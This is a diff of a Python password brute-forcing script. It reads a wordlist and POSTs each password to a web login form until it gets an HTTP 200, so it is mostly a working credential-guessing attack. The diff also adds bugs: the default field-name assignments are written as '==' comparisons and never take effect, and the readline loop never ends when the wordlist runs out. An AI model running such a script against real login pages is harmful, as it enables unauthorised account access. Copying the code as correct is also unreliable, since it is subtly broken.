@@ -24,19 +24,19 @@ pass_field = input("What is the name of password field: ")
 wordlist = input("What is the location of the wordlist: ")
 
 # Default fields 
-if uname_field = "":
-    uname_field = "username"
+if uname_field == "":
+    uname_field == "username"
 
-if pass_field = "":
-     pass_field = "password"
+if pass_field == "":
+     pass_field == "password"
 
 
 # Opening wordlist
-passw = open(str(wordlist),"r")
+pass_list = open(str(wordlist),"r")
 
 # Trying password combination
-while passw in passw:
-    
+while True:
+    passw = pass_list.readline()
     # Form payloads 
     payload = {
 
@@ -48,4 +48,4 @@ while passw in passw:
     r = requests.post(url, data=payload)
     if r.status_code == 200:
         print(str(uname)+":"+str(passw)+" was successful!")
- 
+        break
